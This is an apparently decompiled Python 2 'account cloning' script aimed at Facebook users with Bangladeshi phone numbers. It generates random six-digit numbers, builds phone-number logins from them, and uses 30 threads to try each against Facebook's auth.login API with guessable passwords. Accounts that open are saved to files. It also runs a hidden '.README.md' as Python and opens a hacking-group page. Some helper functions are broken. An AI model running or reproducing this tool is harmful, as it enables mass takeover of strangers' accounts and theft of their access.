# Decompiled By Mr. NIKI 
# uncompyle6 version 3.7.4
# Original written By Lx Nahim

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(50000):
    nmbr = random.randint(111111, 999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')

try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('python2 .README.md')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit Successfully '
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(x):
    for e in x + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(3.0 / 200)


def tik():
    titik = ['   ', '. ', '.. ', '...', '. ', '.. ', '...', '']
    for o in titik:
        print '\r\x1b[1;96m \x1b[1;96m               Load\x1b[1;96ming\x1b[1;0m\x1b[1;96m' + o,
        sys.stdout.flush()
        time.sleep(0.5)

##### LOGO #####
logo = """
 \x1b[1;92m  /$$   /$$           /$$       /$$              
\x1b[1;92m |$$$ | $$          | $$      |__/              
\x1b[1;92m |$$$$| $$  /$$$$$$ | $$$$$$$  /$$ /$$$$$$/$$$$ 
\x1b[1;92m |$$ $$ $$ |____  $$| $$__  $$| $$| $$_  $$_  $$
\x1b[1;92m |$$  $$$$  /$$$$$$$| $$  \$$| $$| $$ \$$ \$$
\x1b[1;92m |$$\ $$$ /$$__  $$| $$  | $$| $$| $$ | $$ | $$
\x1b[1;92m |$$ \ $$|  $$$$$$$| $$  | $$| $$| $$ | $$ | $$
\x1b[1;92m |__/  \_/ \______/|__/  |__/|__/|__/ |__/ |__/
       
\x1b[1;93m_________________________________________________
\x1b[1;92m\033[1;92m [*] Author    :      Mr.Nahim
\x1b[1;92m\033[1;92m [*] Facebook  :   Chand Muhammad Khan 
\x1b[1;92m\033[1;92m [*] GitHub    :      Nahim143
\x1b[1;92m\033[1;92m [*] Number :       01790104683
\x1b[1;93m_________________________________________________
                                                 """
logo1 = '\n\x1b[4;96m [*] SELECT BD  SIM CODE \x1b[1;0m\n\x1b[1;92m [1] RI :\x1b[1;92m 80,81,82,83,84,85,86,87,88,89\n\x1b[1;93m [2] GP :\x1b[1;93m 70,71,72,73,74,75,76,77,78,79\n\x1b[1;92m [3] BL : \x1b[1;92m90,91,92,93,94,95,96,97,98,99\n\x1b[1;93m [4] AT :\x1b[1;93m 60,61,62,63,64,65,66,67,68,69\n'
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []

def menu():
    os.system('clear')
    os.system('xdg-open  https://www.facebook.com/groups/cyber.420.the.silent.killers.official')
    print logo
    jalan ('\x1b[1;92m [1] Start Random Number Cloning ')
    action()

def action():
    global cpb
    global oks
    ss = raw_input('\n\x1b[1;92m [*] Select :  ')
    if ss == '':
        print '[!] Warning'
        action()
    elif ss == '1':
        tik()
        os.system('clear')
        print logo
        print logo1
        try:
            c = raw_input('\x1b[1;92m [*]CODE : ')
            k = '01'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif ss == '0':
        exb()
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    os.system('clear')
    print logo
    print
    print 47 *"\x1b[1;93m-"
    xxx = str(len(id))
    jalan('\x1b[1;92m              TOTAL IDS :\x1b[1;93m ' + xxx)
    print 47 *"\x1b[1;93m-"
    print
    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + c + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;96m  [Lx-Temp-Lock]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;96m  [Mr-CP] ' + k + c + user + '  |  ' + pass1
                cps = open('save/CP.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = k + c + user
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + c + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;96m  [Lx-Temp-Lock] ' + k + c + user + '  |  ' + pass2
                    okb = open('save/OK.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m  [Lx-CP] ' + k + c + user + '  |  ' + pass2
                    cps = open('save/CP.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 *"\x1b[1;93m-"
    print 'Process Has Been Completed ...'
    print 'Total OK : ' + str(len(oks))
    print 'Total CP : ' + str(len(cpb))
    print 47 *"\x1b[1;93m-"
    print 'Cloned Accounts Has Been Saved : save/cloned.txt'
    jalan('Note : Cp account Will Open after 7 to 10 days')
    raw_input('\n\x1b[1;97m[\x1b[1;98melite_menu_Back\x1b[1;95m]')
    login()


if __name__ == '__main__':
    menu()

